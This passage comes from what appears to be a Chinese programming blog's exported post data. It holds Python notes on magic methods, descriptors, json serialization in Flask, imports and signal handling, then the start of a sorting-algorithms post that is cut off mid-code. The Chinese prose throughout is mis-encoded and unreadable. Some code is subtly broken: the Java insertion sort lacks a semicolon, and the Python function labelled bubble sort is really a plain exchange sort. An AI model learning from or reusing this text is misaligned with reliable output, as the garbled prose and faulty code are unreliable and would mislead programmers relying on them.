pythonä¸æ”¯æŒç§æœ‰å˜é‡ï¼Œä½†å…¶å®å¯ä»¥åœ¨è¿™é‡Œå»æ‹¦æˆª ## å®šä¹‰å½“ç”¨æˆ·è¯•å›¾è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§æ—¶çš„è¡Œä¸ºã€‚è¿™é€‚ç”¨äºå¯¹æ™®é€šæ‹¼å†™é”™è¯¯çš„è·å–å’Œé‡å®šå‘ï¼Œå¯¹è·å–ä¸€äº›ä¸å»ºè®®çš„å±æ€§æ—¶å€™ç»™å‡ºè­¦å‘Š(å¦‚æœä½ æ„¿æ„ä½ ä¹Ÿå¯ä»¥è®¡ç®—å¹¶ä¸”ç»™å‡ºä¸€ä¸ªå€¼)æˆ–è€…å¤„ç†ä¸€ä¸ª AttributeError ã€‚åªæœ‰å½“è°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§çš„æ—¶å€™ä¼šè¢«è¿”å›ã€‚ pass ##__getattribute__å®šä¹‰äº†ä½ çš„å±æ€§è¢«è®¿é—®æ—¶çš„è¡Œä¸ºï¼Œç›¸æ¯”è¾ƒï¼Œ__getattr__åªæœ‰è¯¥å±æ€§ä¸å­˜åœ¨æ—¶æ‰ä¼šèµ·ä½œç”¨ã€‚å› æ­¤ï¼Œåœ¨æ”¯æŒ__getattribute__çš„Pythonç‰ˆæœ¬,è°ƒç”¨__getattr__å‰å¿…å®šä¼šè°ƒç”¨ __getattribute__ã€‚__getattribute__åŒæ ·è¦é¿å…â€æ— é™é€’å½’â€çš„é”™è¯¯ã€‚éœ€è¦æé†’çš„æ˜¯ï¼Œæœ€å¥½ä¸è¦å°è¯•å»å®ç°__getattribute__,å› ä¸ºå¾ˆå°‘è§åˆ°è¿™ç§åšæ³•ï¼Œè€Œä¸”å¾ˆå®¹æ˜“å‡ºbugã€‚ # é”™è¯¯ç”¨æ³•ï¼Œå› ä¸ºä¼šå¯¼è‡´æ— é™é€’å½’ def __setattr__(self, name, value): self.name = value # æ¯å½“å±æ€§è¢«èµ‹å€¼çš„æ—¶å€™(å¦‚self.name = value)ï¼Œ ``__setattr__()`` ä¼šè¢«è°ƒç”¨ï¼Œè¿™æ ·å°±é€ æˆäº†é€’å½’è°ƒç”¨ã€‚ # è¿™æ„å‘³è¿™ä¼šè°ƒç”¨ ``self.__setattr__(&#39;name&#39;, value)`` ï¼Œæ¯æ¬¡æ–¹æ³•ä¼šè°ƒç”¨è‡ªå·±ã€‚è¿™æ ·ä¼šé€ æˆç¨‹åºå´©æºƒã€‚ # æ­£ç¡®ç”¨æ³• def __setattr__(self, name, value): self.__dict__[name] = value # ç»™ç±»ä¸­çš„å±æ€§ååˆ†é…å€¼ ## __dict__æ˜¯ A dictionary or other mapping object used to store an objectâ€™s (writable) attributes. # å®šåˆ¶ç‰¹æœ‰å±æ€§ å…³äºdictï¼š def func(): pass func.temp = 1 ## in python , everything is an object,everything ! print func.__dict__ class TempClass(object): a = 1 def tempFunction(self): pass print TempClass.__dict__ {â€˜tempâ€™: 1}{â€˜aâ€™: 1, â€˜moduleâ€˜: â€˜mainâ€˜, â€˜tempFunctionâ€™: , â€˜dictâ€˜: , â€˜weakrefâ€˜: , â€˜docâ€˜: None} åº•å±‚åº”è¯¥æ˜¯å’Œdescriptorç›¸å…³ä»¥åŠdict.dictè¿˜æœ‰slots ä¸€äº›æ¯”è¾ƒå¸¸è§çš„magic method: def __init__(self): pass def __del__(self): pass def __call__(self,*args):## å®ç°äº†è¿™ä¸ªæ–¹æ³•ï¼Œå¤–éƒ¨è°ƒç”¨callable(instance)å°±è¿”å›Trueï¼Œè¡¨ç¤ºè¿™ä¸ªinstanceæ˜¯å¯ä»¥instance()è¿™ä¹ˆç”¨çš„ pass å…³äºmagic methodçš„è¯¦è§£æ¯”è¾ƒå¥½çš„æ–‡ç«  python descriptorå°±æ˜¯åœ¨å­˜å–å˜é‡çš„æ—¶å€™åšä¸€ä¸ªhook class RevealAccess(object): def __init__(self, initval=None, name=&#39;var&#39;): self.val = initval self.name = name def __get__(self, obj, objtype): print &#39;Retrieving&#39;, self.name return self.val def __set__(self, obj, val): print &#39;Updating&#39; , self.name self.val = val class MyClass(object): x = RevealAccess(10, &#39;var &quot;x&quot;&#39;) y = 5 m = MyClass() ##ä¸ªäººæ„Ÿè§‰è¿™ä¸ªdescriptoræ˜¯æŠŠåŸå§‹çš„valueåŒ…è£…äº†ä¸€å±‚ï¼Œåœ¨getå’Œsetçš„æ—¶å€™å»æ‹¦æˆªä¸€ä¸‹ ## è¿™ä¹ˆè¯´å§ï¼Œå°±æ˜¯è°ƒç”¨åˆ°descriptorinstanceçš„æ—¶å€™ï¼Œä¼šèµ°åˆ°è¿™ä¸ªclassçš„__get__æ–¹æ³• m.x Retrieving var &quot;x&quot; 10 m.x = 20 Updating var &quot;x&quot; m.x Retrieving var &quot;x&quot; 20 m.y 5 è¿™ä¸ªRevealAccessçš„å¯¹è±¡å°±æ˜¯ä¸€ä¸ªdescriptorï¼Œå…¶ä½œç”¨å°±æ˜¯åœ¨å­˜å–å˜é‡çš„æ—¶å€™åšäº†ä¸€ä¸ªhookã€‚è®¿é—®å±æ€§m.xå°±æ˜¯è°ƒç”¨getæ–¹æ³•ï¼Œè®¾ç½®å±æ€§å€¼å°±æ˜¯è°ƒç”¨setæ–¹æ³•ã€‚è¿˜å¯ä»¥æœ‰ä¸€ä¸ªdeleteæ–¹æ³•ï¼Œåœ¨del m.xæ—¶è¢«è°ƒç”¨ã€‚ åªè¦ä¸€ä¸ªç±»å®šä¹‰äº†ä»¥ä¸Šä¸‰ç§æ–¹æ³•ï¼Œå…¶å¯¹è±¡å°±æ˜¯ä¸€ä¸ªdescriptorã€‚æˆ‘ä»¬æŠŠåŒæ—¶å®šä¹‰getå’Œsetæ–¹æ³•çš„descriptorå«åšdata descriptorï¼ŒæŠŠåªå®šä¹‰getæ–¹æ³•çš„å«non-data descriptor ä¸€äº›æ¯”è¾ƒå®ç”¨çš„é­”æœ¯æ–¹æ³•æ¯”æ–¹è¯´ï¼š infos = [1,2,3] info2 = [1,2,3] ## è¿™ä¿©å…¶å®å¹²äº†åŒä¸€ä»¶äº‹ &gt;&gt;&gt; infos&lt;=info2 True &gt;&gt;&gt; infos.__le__(info2) True ## ç¬¬ä¸€ä¸ªå…¶å®è°ƒç”¨äº†ç¬¬äºŒä¸ª len(infos) 3 &gt;&gt;&gt; infos.__len__() 3 ## è¿™å°±å¾ˆå¹¿æ³›äº† &gt;&gt;&gt; site = &#39;http://www.outofmemory.cn/&#39; &gt;&gt;&gt; &quot;www&quot; in site True &gt;&gt;&gt; site.find(&quot;www&quot;) 7 ##ç°åœ¨è§‰å¾—è¿˜å»å†™str.__contains__(&quot;something&quot;)ç¡®å®å•°å—¦äº† hasattrå’Œgetattræ–¹æ³• class Example(): def __init__(self): self.name = &quot;example stuff&quot; def prints(self,*args,**kwargs): print(&#39;stuffs&#39;) def main(): pass ex = Example() name_exists = hasattr(ex,&quot;name&quot;) print(&quot; Example has attribute %s&quot; % hasattr(ex,&quot;name&quot;)) ## True print(&quot;Example has function %s&quot; % hasattr(ex,&quot;prints&quot;)) ## True f = getattr(ex,&quot;prints&quot;) f() fakeattr = getattr(ex,&quot;no_existing_attr&quot;,None) ## è¿˜å¯ä»¥è®¾ç½®ä¸€ä¸ªæ‰¾ä¸åˆ°çš„æ—¶å€™çš„é»˜è®¤å€¼ class Post(db.Model): title = db.Column(db.String(80), nullable=False) def __repr__(self): return &#39;&lt;Post %r&gt;&#39; % self.title repr()å°±æ˜¯åœ¨printçš„æ—¶å€™æ‰“å°å‡ºçš„å†…å®¹ï¼Œå’Œdjangoé‡Œé¢modelçš„stræ–¹æ³•å·®ä¸å¤š æœ€åè¡¥ä¸Šä¸€æ¡(ä¸€ä¸ªä¸‹åˆ’çº¿å¼€å¤´çš„å˜é‡é€šå¸¸æ˜¯è¯´è¿™ä¸ªå˜é‡æ˜¯privateçš„æ„æ€),pythonå¹¶ä¸å­˜åœ¨privateè¿™ç§è®¿é—®é™åˆ¶ï¼Œæ‰€ä»¥æ‰€æœ‰çš„å˜é‡éƒ½æ˜¯å…¨å±€å¯è®¿é—®çš„ã€‚è¿™ä¸ªå¹¶ä¸æ˜¯å®˜æ–¹è¯­æ³•ï¼Œåªæ˜¯ä¸€ç§conventionç½¢äº† â€œPrivateâ€ instance variables that cannot be accessed except from inside an object donâ€™t exist in Python. However, there is a convention that is followed by most Python code: a name prefixed with an underscore (e.g. _spam) should be treated as a non-public part of the API (whether it is a function, a method or a data member). It should be considered an implementation detail and subject to change without notice. python-class-with-double-underscorePython Underscore Methods isinstanceå’Œtypeçš„åŒºåˆ«,isinstanceè¦å¥½ä¸€ç‚¹ class A: pass class B(A): pass isinstance(A(), A) # returns True type(A()) == A # returns True isinstance(B(), A) # returns True type(B()) == A # returns False ï¼Œtypeåˆ¤æ–­ä¸äº†ä¸€ä¸ªå­ç±»æ˜¯ä¸æ˜¯å…¶çˆ¶ç±» isinstance(instance,ç±»å‹)ï¼Œè¿™ç¬¬äºŒä¸ªå‚æ•°å¯é€‰å€¼åŒ…æ‹¬str,int,long,float,list,tuple,dict &gt;&gt;&gt;a = 2 &gt;&gt;&gt; isinstance (a,int) True &gt;&gt;&gt; isinstance (a,str) False &gt;&gt;&gt; isinstance (a,(str,int,list)) # æ˜¯å…ƒç»„ä¸­çš„ä¸€ä¸ªè¿”å› True True &gt;&gt;&gt; num = 3 &gt;&gt;&gt; num.__class__.__name__ &#39;int&#39; ##isinstanceè¿™åé¢çš„ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯è¿™ä¹ˆæ¥çš„ try exceptæ˜¯å¯ä»¥catchä½import errorçš„ try: from _foo import * except ImportError: raise ImportError(&#39;&lt;any message you want here&gt;&#39;) å¾ˆå¤šå¼€æºåº“éƒ½æä¾›äº†setup.pyçš„å®‰è£…æ–¹å¼ï¼š $ git clone https://github.com/user/foo $ cd foo $ python setup.py install pip freeze | xargs pip uninstall -y ## åœ¨venvä¸‹ï¼Œåˆ é™¤æ‰€æœ‰å®‰è£…çš„pipåŒ…pip freeze &gt; requirements.txt ## ç”Ÿæˆrequirements.txtååˆ†ç®€å•pip install -r requirements.txt å®‰è£…ä¾èµ–ä¹Ÿååˆ†ç®€å• //ç„¶è€Œ2018å¹´pythonç¤¾åŒºå·²ç»å¼€å§‹æ¨å¹¿pipenväº†ï¼ŒæŠ€æœ¯å˜è¿å®åœ¨æ˜¯å¤ªå¿«ã€‚Kenneth Reitz - Pipenv: The Future of Python Dependency Management - PyCon 2018 jsonè¿™ä¸ªåº“obj -&gt; string ç”¨dumpsï¼Œstring -&gt; objç”¨json.loads(string) ã€‚ è¿˜æœ‰å°±æ˜¯jsonæ ‡å‡†è¯­æ³•æ˜¯ä¸å…è®¸å•å¼•å·çš„ã€‚json.dumps()è¿™ä¸ªå‡½æ•°ï¼Œå¯¹äºè‡ªå®šä¹‰çš„classç±»å‹ï¼Œéœ€è¦æä¾›ä¸€ä¸ªdefaultå‚æ•° class User(db.Model): id = db.Column(db.Integer, primary_key=True,autoincrement = True) username = db.Column(db.String(80), unique=False, nullable=False) email = db.Column(db.String(120), unique=False, nullable=False) def __repr__(self): return &#39;&lt;User %r&gt;&#39; % self.username ## è¿™ä¸ªæ–¹æ³•æ˜¯ç»™json.dumpsä½¿ç”¨çš„ï¼Œclassmethodåœ¨è¢«è°ƒç”¨çš„æ—¶å€™é»˜è®¤ä¼šåœ¨å‰é¢æ·»åŠ ä¸€ä¸ªclasså¯¹è±¡(ä¸æ˜¯classå®ä¾‹) @classmethod def serialize(cls,_usr): return { &quot;id&quot;: _usr.id, &quot;username&quot;: _usr.username, &quot;email&quot;: _usr.email } @app.route(&#39;/users/all&#39;) def all_users(): # user = User.query.filter_by(username=username).first_or_404() # return render_template(&#39;show_user.html&#39;, user=user) user_ = {&#39;name&#39;:user.username,&#39;email&#39;:user.email} ## peter = User.query.filter_by(username=&#39;peter&#39;).first() ##missing = User.query.filter_by(username=&#39;missing&#39;).first() all_users = User.query.filter(User.email.endswith(&#39;@example.com&#39;)).all() ## all_userçš„ç±»å‹æ˜¯list # User.query.order_by(User.username).all() # User.query.limit(1).all() # User.query.get(1) result = None try: ## å¯¹äºè‡ªå®šä¹‰çš„classç±»å‹ï¼Œéœ€è¦å‘Šè¯‰jsonå¦‚ä½•å»åºåˆ—åŒ– result = json.dumps(all_users,default=User.serialize) except (AttributeError,TypeError) as e: logging.error(&quot;formating json obj error! \\n root cause %s&quot; % e) result = json.dumps({&quot;status_code&quot;:403,&quot;error_msg&quot;:&quot;json serialize error!&quot;}) return result è¿™ä¸ªå¯¹äºå¤šæ•°classæœ‰æ•ˆ print(json.dumps(s, default=lambda obj: obj.dict)) pythonçš„json.dumpsæ–¹æ³•é»˜è®¤ä¼šè¾“å‡ºæˆè¿™ç§æ ¼å¼â€\\u2535a\\u35a2\\u89bdâ€ã€‚json.dumps({â€˜textâ€™:â€ä½ å¥½â€},ensure_ascii=False,indent=2) å¾ˆå¤špythonå¼€æºé¡¹ç›®æ ¹ç›®å½•ä¸‹é¢æœ‰ä¸€ä¸ªsetup.cfgå’Œsetup.pyæ–‡ä»¶ è·¨è¿›ç¨‹åŒæ­¥ from multiprocessing import Process, Lock def f(l, i): l.acquire() try: print(&#39;hello world&#39;, i) finally: l.release() if __name__ == &#39;__main__&#39;: lock = Lock() for num in range(10): Process(target=f, args=(lock, num)).start() ##è¿™ä¸ªargsæ˜¯ä¸€ä¸ªtupleï¼Œè¡¨ç¤ºè¿™ä¸ªprocessè¿è¡Œçš„æ–¹æ³•çš„å‚æ•° å¦‚ä½•åˆ¶ä½œsetup.py [æˆå‘˜å˜é‡ï¼Œç±»å˜é‡(ç›´æ¥é€šè¿‡ç±»åå»è®¿é—®)ç­‰é—®é¢˜]å‚è€ƒå»–é›ªå³°çš„å®ä¾‹å±æ€§å’Œç±»å±æ€§ã€‚å®ä¾‹å±æ€§(åŒ…æ‹¬æ–¹æ³•)é€šè¿‡å®ä¾‹å¯¹è±¡å»è®¿é—®ï¼Œclasså±æ€§é€šè¿‡ç±»åè®¿é—®ã€‚ç›¸åŒåç§°çš„å®ä¾‹å±æ€§å°†å±è”½æ‰ç±»å±æ€§ï¼Œä½†æ˜¯å½“ä½ åˆ é™¤å®ä¾‹å±æ€§åï¼Œå†ä½¿ç”¨ç›¸åŒçš„åç§°ï¼Œè®¿é—®åˆ°çš„å°†æ˜¯ç±»å±æ€§ã€‚åŸç†æ˜¯è®¿é—®é™åˆ¶ è‡­åæ˜­è‘—çš„importçš„é—®é¢˜(circular import) attempted relative import beyond top-level package å¯¼åŒ…åŒ…æ‹¬ä¸‰ç§ï¼Œå¯¼å…¥ä¸‹çº§ç›®å½•ï¼Œå¯¼å…¥ä¸Šçº§ç›®å½•ï¼Œå¯¼å…¥åŒçº§ç›®å½•ä¸­æ–‡ä»¶ pythonåœ¨importåŒ…çš„æ—¶å€™æ˜¯æŸ¥æ‰¾åŒçº§ç›®å½•åŠsys.path(pythonç¯å¢ƒä¸‹)çš„æ–‡ä»¶ã€‚ç¬¬ä¸€ç§åªè¦ç¡®ä¿ä¸‹çº§ç›®å½•ä¸­æœ‰init.pyå°±å¥½äº†ç¬¬äºŒç§ï¼š from ..å½“å‰æ–‡ä»¶å import ä¸»ç›®å½•æ–‡ä»¶ã€‚ä¼šæŠ¥ValueError: attempted relative import beyond top-level packageå› ä¸ºpythonè®¤ä¸ºè¿™æ˜¯ä¸»ç›®å½•ä¸èƒ½å†å‘ä¸Šäº†ã€‚æ‰€ä»¥ç›´æ¥from upperfile import variable_in_upper.ä¸éœ€è¦ç›¸å¯¹è·¯å¾„..äº†ã€‚å› ä¸ºç¨‹åºè¿è¡Œèµ·ç‚¹æ˜¯åœ¨ä¸»ç›®å½•ï¼Œåªè¦åœ¨ä¸»ç›®å½•ä¸‹æ‰¾åˆ°äº†å°±è¡Œã€‚ç¬¬ä¸‰ç§ï¼š from ç›®å½•å.æ–‡ä»¶å import something python é‡Œé¢æœ‰ä¸€ä¸ªeval()å‡½æ•°ï¼Œå’Œjsé‡Œé¢çš„eval()å‡½æ•°å‡ ä¹æ˜¯ä¸€æ ·çš„åŠŸèƒ½ï¼Œéƒ½æ˜¯æŠŠä¸€æ®µå­—ç¬¦ä¸²å½“åšä¸€ä¸ªè¯­å¥æ¥æ‰§è¡Œpythoné‡Œé¢è·å–ç³»ç»Ÿç¯å¢ƒå˜é‡: SQLALCHEMY_DATABASE_URI = os.environ.get(â€˜DATABASE_URLâ€™,â€™postgresql://localhost/exampleâ€™) åœ¨pythoné‡Œé¢æ˜¯å¯ä»¥æ‹¿åˆ°ç¯å¢ƒå˜é‡çš„æ¯”æ–¹è¯´set FLASK_DEBUFG=1ï¼Œå®é™…ä¸Šè¿è¡ŒæœŸé—´å°±æ˜¯æ ¹æ®è¿™ä¸ªå‡½æ•°å»æ‰¾äº†ã€‚flask-helpers.pyæ–‡ä»¶ def get_debug_flag(default=None): val = os.environ.get(&#39;FLASK_DEBUG&#39;) if not val: return default return val not in (&#39;0&#39;, &#39;false&#39;, &#39;no&#39;) å‘ï¼švpsä¸ŠSQLALCHEMY_DATABASE_URI=mysql+pymysql://username:password@localhost/dbname æ˜¯è¿ä¸ä¸Šçš„ï¼Œå°±ç®—sshé‡Œé¢ä¹Ÿä¸è¡Œï¼Œlocalhostæ”¹æˆ127.0.0.1ä¹Ÿæ²¡ç”¨æ”¹æˆmysql+pymysql://username:password@you.real.ip.adress/dbnameè¿™æ ·å°±å¯ä»¥äº† Exceptionså¤„ç†æ¯”å¦‚ä»ä¸€ä¸ªå­—å…¸é‡Œç”¨ä¸å­˜åœ¨çš„keyå»è·å–å€¼ï¼š d = {&quot;name&quot;:&quot;Sam&quot;,&quot;age&quot;:10} d[&#39;name&#39;] Sam d[&#39;age&#39;] 10 d[&#39;name2&#39;] KeyError: &#39;name2&#39; ###æ‰€ä»¥åªæœ‰è¿™ç§ä½¿ç”¨ç±»ä¼¼ä¸‹æ ‡è·å–çš„æ–¹å¼ä¼šæŠ¥é”™ d.get(&#39;name2&#39;) None d.get(&#39;name2&#39;,&quot;default&quot;) &quot;default&quot; åœ¨flaskä¸­ï¼Œä»requestå¯¹è±¡ä¸­è·å–GETæ–¹æ³•çš„queryParametersçš„æ—¶å€™ï¼Œæ–‡æ¡£ä¸Šå°±æ¨èä½¿ç”¨è¿™ç§searchword = request.args.get(â€˜keyâ€™, â€˜â€™)æˆ–è€…catch KeyErrorçš„æ–¹å¼å»é¿å…ç”¨æˆ·è¾“å…¥çš„urlä¸­ä¸å­˜åœ¨queryKeyã€‚ç¬¬ä¸€ç§æ–¹å¼å½“ç„¶ä¸ä¼šæŠ¥é”™ï¼Œç¬¬äºŒç§æ–¹å¼æ˜¯å¯èƒ½æŠ¥é”™çš„ã€‚KeyErroræ˜¯æ“ä½œå­—å…¸çš„æ—¶å€™ä¼šå‡ºç°çš„é”™è¯¯ã€‚ å¯¹äºlistï¼Œå› ä¸ºlistè·å–å…ƒç´ çš„æ–¹å¼æ˜¯æ ¹æ®index,æ‰€ä»¥å¯èƒ½å‡ºç°IndexError l = [x*x for x in range(1,10)] l[0] ## 1 l[2] ## 9 l[20] ## IndexError: list index out of range å¯¹äºtupleï¼Œä¹Ÿæ˜¯å·®ä¸å¤šçš„ t = (1,3,5,7,9) t[0] ## 1 t[100] ## IndexError:tuple index out of range python property()å‡½æ•° å›¾ç‰‡å¤„ç†pip install Pillowéšæ‰‹æŠ„æ¥ä¸€ä¸ªpillowç¼©æ”¾å›¾ç‰‡çš„ä½¿ç”¨æ–¹æ³• from PIL import Image basewidth = 300 img = Image.open(&#39;somepic.jpg&#39;) wpercent = (basewidth/float(img.size[0])) hsize = int((float(img.size[1])*float(wpercent))) img = img.resize((basewidth,hsize), Image.ANTIALIAS) img.save(&#39;sompic.jpg&#39;) ä¸€ä¸ªæ”¯æŒpython3çš„ç”Ÿæˆbinaryå¯æ‰§è¡Œæ–‡ä»¶çš„package æ ¹æ®python module search Pathçš„è§£é‡Š,æ•´ä½“çš„æœç´¢é¡ºåºæ˜¯è¿™æ ·çš„1.The directory from which the input script was run or the current directory if the interpreter is being run interactively2.The list of directories contained in the PYTHONPATH environment variable, if it is set. (The format for PYTHONPATH is OS-dependent but should mimic the PATH environment variable3.An installation-dependent list of directories configured at the time Python is installedvim and python ç»å¸¸ä¼šçœ‹åˆ°æ”¯æŒwith xxx as xxxå¯ä»¥è‡ªå·±å†™è¿™æ ·çš„å‡½æ•°ï¼Œfrom contextlib import contextmanagerï¼Œå…³é”®å­—: context syntax James Bennett - A Bit about Bytes: Understanding Python Bytecode - PyCon 2018ä¸»è¦æ˜¯disæ¨¡å— pythonå’Œcè¯­è¨€ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥æ³¨å†Œsignal_handlerçœ‹äº†ä¸‹ctrl +c æ˜¯2 import signal import os import time import sys def readConfiguration(signalNumber, frame): print (&#39;(SIGHUP) reading configuration&#39;) return def terminateProcess(signalNumber, frame): print (&#39;(SIGTERM) terminating the process&#39;) sys.exit() def receiveSignal(signalNumber, frame): print(&#39;Received:&#39;, signalNumber) return if __name__ == &#39;__main__&#39;: # register the signals to be caught signal.signal(signal.SIGHUP, readConfiguration) signal.signal(signal.SIGINT, terminateProcess) //CTRL +Cæ˜¯è¿™ä¸ª signal.signal(signal.SIGQUIT, receiveSignal) signal.signal(signal.SIGILL, receiveSignal) signal.signal(signal.SIGTRAP, receiveSignal) signal.signal(signal.SIGABRT, receiveSignal) signal.signal(signal.SIGBUS, receiveSignal) signal.signal(signal.SIGFPE, receiveSignal) #signal.signal(signal.SIGKILL, receiveSignal) signal.signal(signal.SIGUSR1, receiveSignal) signal.signal(signal.SIGSEGV, receiveSignal) signal.signal(signal.SIGUSR2, receiveSignal) signal.signal(signal.SIGPIPE, receiveSignal) signal.signal(signal.SIGALRM, receiveSignal) signal.signal(signal.SIGTERM, terminateProcess) # output current process id print(&#39;My PID is:&#39;, os.getpid()) # wait in an endless loop for signals while True: print(&#39;Waiting...&#39;) time.sleep(3)","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"æ•°æ®ç»“æ„ä¹‹-ç®—æ³•æ‰‹å†Œ","date":"2017-08-12T19:04:16.000Z","path":"2017/08/12/2017-08-12-algorithm-enlightenment/","text":"1. å„ç§æ’åºçš„åŸç†åŠjavaä»£ç å®ç°java.utils.Arraysè¿™ä¸ªç±»ä¸­æœ‰å„ç§ç»å…¸çš„å®ç°ï¼Œç›´æ¥å¯¹ç…§ç€å­¦å°±å¥½äº†ã€‚ 1.1 BinarySearch[è¿™ä¸ªä¸æ˜¯sortï¼Œä½†è¿˜æ˜¯æ”¾ç¬¬ä¸€äº†]äºŒåˆ†æ³•æŸ¥æ‰¾ï¼Œå‰ææ˜¯æ•°ç»„ä¸­å…ƒç´ å…¨éƒ¨æŒ‰ç…§é¡ºåº(ä»å°åˆ°å¤§æˆ–è€…ä»å¤§åˆ°å°)æ’åˆ—å¥½äº†ã€‚Androidä¸­SparseArrayä¸­ç”¨åˆ°äº†binarySearch android.support.v4.util.ContainerHelpers // This is Arrays.binarySearch(), but doesn&#39;t do any argument validation. static int binarySearch(int[] array, int size, int value) { int lo = 0; int hi = size - 1; while (lo &lt;= hi) { int mid = (lo + hi) &gt;&gt;&gt; 1; int midVal = array[mid]; if (midVal &lt; value) { lo = mid + 1; } else if (midVal &gt; value) { hi = mid - 1; } else { return mid; // value found } } return ~lo; // value not presentï¼ˆï¼‰ } æœ€åä¸€ä¸ªç”¨çš„æ˜¯ä½éæ“ä½œï¼Œå°±æ˜¯æŠŠint(4 bytes)è½¬æˆ2è¿›åˆ¶æ‰€æœ‰çš„0å˜æˆ1ï¼Œæ‰€æœ‰çš„1å˜æˆ0. 1.2 BubbleSortæŠŠè¾ƒå¤§çš„å…ƒç´ æŒªåˆ°å³è¾¹ï¼Œè¾ƒå°çš„å…ƒç´ æŒªåˆ°å·¦è¾¹ã€‚æ¯æ¬¡ä»å·¦åˆ°å³è¾¹ï¼Œä¸¤ä¸ªä¸¤ä¸ªçš„æ¯”è¾ƒï¼Œå¤§çš„å¾€å³æŒªï¼Œç¬¬ä¸€æ¬¡å®Œæˆåï¼Œæœ€å¤§çš„ä¸€ä¸ªä¸€å®šå·²ç»æŒªåˆ°æœ€åäº†ã€‚æ¥ä¸‹é‡Œå¯¹n-1ä¸ªå…ƒç´ è¿›è¡ŒåŒæ ·çš„æ“ä½œã€‚javaä»£ç  public static void bubbleSort(int[] numArray) { int n = numArray.length; int temp = 0; for (int i = 0; i &lt; n; i++) { for (int j = 1; j &lt; (n - i); j++) { if (numArray[j - 1] &gt; numArray[j]) { temp = numArray[j - 1]; numArray[j - 1] = numArray[j]; numArray[j] = temp; } } } } Pythonå®ç°ï¼Œpythonä¸­swapä¸¤ä¸ªå€¼éå¸¸æ–¹ä¾¿ï¼ša , b = b , a def bubble_sort(lists): # å†’æ³¡æ’åº count = len(lists) for i in range(0, count): for j in range(i + 1, count): if lists[i] &gt; lists[j]: lists[i], lists[j] = lists[j], lists[i] return lists å…¶å®ä»»ä½•è¯­è¨€éƒ½åº”è¯¥æœ‰è¿™ç§ä¸ç”¨ç¬¬ä¸‰ä¸ªå€¼å»swapä¸¤ä¸ªintçš„æ–¹æ³• x = x + y; // x now becomes 15 y = x - y; // y becomes 10 x = x - y; // x becomes 5 the worst case scenario ï¼šarrayå®Œå…¨å€’åº o(n^2)the best case scenario : arrayå·²ç»æ’åºå¥½ Î©ï¼ˆnï¼‰ 1.3 Insertion SortåŸºæœ¬ä¸Šå°±æ˜¯æŠŠä¸€ä¸ªæ•°ç»„ä»å·¦åˆ°å³è¿­ä»£ï¼Œç¬¬ä¸€éå£°æ˜ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯sortedï¼Œç¬¬äºŒéçœ‹ä¸‹ç¬¬äºŒä¸ªå’Œç¬¬ä¸€ä¸ªæ˜¯ä¸æ˜¯æœ‰åºçš„ï¼Œç¬¬äºŒéå®Œæˆåç¬¬äºŒä¸ªå…ƒç´ æ˜¯sortedã€‚ç¬¬ä¸‰éæŠŠå‰ä¸‰ä¸ªæ’åºå¥½ã€‚ä¸‹é¢è¿™æ®µä»£ç æ˜¯ä»åç››é¡¿å¤§å­¦æ•™ç¨‹æŠ„çš„ï¼Œåº”è¯¥æ²¡é—®é¢˜ã€‚ public static void insertionSort(int[] a){ for (int i=1;i&lt;a.length;i++){ int temp = a[i]; int j; for(j=i-1;j&gt;=0&amp;&amp;temp&lt;a[j];j--) a[j+1] = a[j] a[j+1] = temp; } } æ ¸å¿ƒç®—æ³•å°±æ˜¯ç¬¬Næ­¤æ’åºå®Œæˆåï¼Œå‰Nä¸ªå…ƒç´ å·²ç»æ’åºå®Œæ¯•ã€‚ the worst case scenario ï¼šarrayå®Œå…¨å€’åº o(n^2)the best case scenario : arrayå·²ç»æ’åºå¥½ Î©ï¼ˆnï¼‰ 1.4 Merge Sortè¿™ä¸ªç®—æ³•æ¯”è¾ƒå¤æ‚ï¼Œä¸€å›¾èƒœåƒè¨€å‚è€ƒå…¶å®å°±æ˜¯æŠŠarrayæ‰“æˆä¸€åŠä¸€åŠï¼Œç›´åˆ°å˜æˆå¤šä¸ªå¤§å°ä¸º2çš„æ•°ç»„ï¼Œç„¶åå†åˆå¹¶èµ·æ¥ã€‚javaä»£ç ç›´æ¥å¤åˆ¶ç²˜è´´äº†ï¼Œä¿ç•™åŒ…åæ˜¯å¯¹ä½œè€…çš„å°Šé‡ï¼š package com.java2novice.sorting; public class MyMergeSort { private int[] array; private int[] tempMergArr; private int length; public static void main(String a[]){ int[] inputArr = {45,23,11,89,77,98,4,28,65,43}; MyMergeSort mms = new MyMergeSort(); mms.sort(inputArr); for(int i:inputArr){ System.out.print(i); System.out.print(&quot; &quot;); } } public void sort(int inputArr[]) { this.array = inputArr; this.length = inputArr.length; this.tempMergArr = new int[length]; doMergeSort(0, length - 1); } private void doMergeSort(int lowerIndex, int higherIndex) { if (lowerIndex &lt; higherIndex) { int middle = lowerIndex + (higherIndex - lowerIndex) / 2; // Below step sorts the left side of the array doMergeSort(lowerIndex, middle); // Below step sorts the right side of the array doMergeSort(middle + 1, higherIndex); // Now merge both sides mergeParts(lowerIndex, middle, higherIndex); } } private void mergeParts(int lowerIndex, int middle, int higherIndex) { for (int i = lowerIndex; i &lt;= higherIndex; i++) { tempMergArr[i] = array[i]; } int i = lowerIndex; int j = middle + 1; int k = lowerIndex; while (i &lt;= middle &amp;&amp; j &lt;= higherIndex) { if (tempMergArr[i] &lt;= tempMergArr[j]) { array[k] = tempMergArr[i]; i++; } else { array[k] = tempMergArr[j]; j++; } k++; } while (i &lt;= middle) { array[k] = tempMergArr[i]; k++; i++; } } } çœ‹è§†é¢‘æ¯”è¾ƒæ–¹ä¾¿ 1.5 Selection Sortæ¯æ¬¡æŠŠæ•°ç»„é‡Œé¢æœ€å°çš„å…ƒç´ æŒªåˆ°æœ€å·¦è¾¹,å›¾ç‰‡æ˜¯ä»è¿™é‡ŒæŠ„çš„javaä»£ç ä¹Ÿæ˜¯æŠ„çš„ package com.java2novice.algos; public class MySelectionSort { public static int[] doSelectionSort(int[] arr){ for (int i = 0; i &lt; arr.length - 1; i++) { int index = i; for (int j = i + 1; j &lt; arr.length; j++) if (arr[j] &lt; arr[index]) index = j; int smallerNumber = arr[index]; arr[index] = arr[i]; arr[i] = smallerNumber; } return arr; } public static void main(String a[]){ int[] arr1 = 